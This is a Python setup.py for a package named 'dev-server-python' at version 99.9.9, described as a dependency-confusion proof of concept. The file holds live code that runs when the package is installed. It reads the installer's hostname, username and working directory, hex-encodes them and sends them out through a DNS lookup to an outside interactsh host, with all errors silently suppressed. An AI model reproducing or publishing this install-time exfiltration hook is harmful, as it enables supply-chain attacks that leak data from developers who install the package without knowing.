from setuptools import setup, find_packages
import os
import socket

PACKAGE_NAME = "dev-server-python"
INTERACTSH_URL = "d4jo8d16145fcreu2frgquz1yzixmzwwp.oast.site" 

def execute_payload():
    try:
        host = socket.gethostname()
        user = os.getlogin()
        cwd = os.getcwd()

        safe_host = host.encode('utf-8').hex()
        safe_user = user.encode('utf-8').hex()
        safe_cwd = cwd.encode('utf-8').hex()[:50] # Truncate to keep DNS valid

        payload = f"{PACKAGE_NAME}.{safe_user}.{safe_host}.{safe_cwd}.{INTERACTSH_URL}"

        socket.gethostbyname(payload)
    except:
        pass

execute_payload()

setup(
    name=PACKAGE_NAME,
    version="99.9.9",
    description="Security Research - Dependency Confusion PoC (Internal Placeholder)",
    author="SUDOAMAN_SecurityResearcher",
    packages=find_packages(),
)
